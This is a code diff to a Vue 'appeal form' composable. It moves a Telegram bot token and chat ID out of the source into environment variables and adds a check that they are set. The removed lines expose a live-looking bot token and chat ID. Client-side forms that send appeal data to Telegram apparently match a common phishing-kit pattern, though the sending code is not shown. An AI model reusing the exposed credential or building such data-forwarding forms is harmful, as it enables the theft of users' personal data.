@@ -187,9 +187,15 @@ export function useAppealForm(emit) {
     const SUBMISSION_ID_KEY = 'submission_id';
     const COOKIE_KEY = 'appeal_step1';
 
-    // Telegram config (EASILY CHANGEABLE)
-    const TELEGRAM_BOT_TOKEN = "8243992860:AAEp2DVoMKm55Jbv-evtAOCbBs96Uq2bgVQ";
-    const TELEGRAM_CHAT_ID = "-1003078888823";
+    // ✅ Telegram config từ .env (VITE) hoặc .env (Vue CLI)
+    const TELEGRAM_BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || process.env.VUE_APP_TELEGRAM_BOT_TOKEN;
+    const TELEGRAM_CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID || process.env.VUE_APP_TELEGRAM_CHAT_ID;
+
+    // ✅ Validate environment variables
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+        console.error('❌ Missing Telegram configuration in environment variables');
+        console.error('Please add VITE_TELEGRAM_BOT_TOKEN and VITE_TELEGRAM_CHAT_ID to your .env.local file');
+    }
 
     // ✅ Phone management
     const phone = ref("");
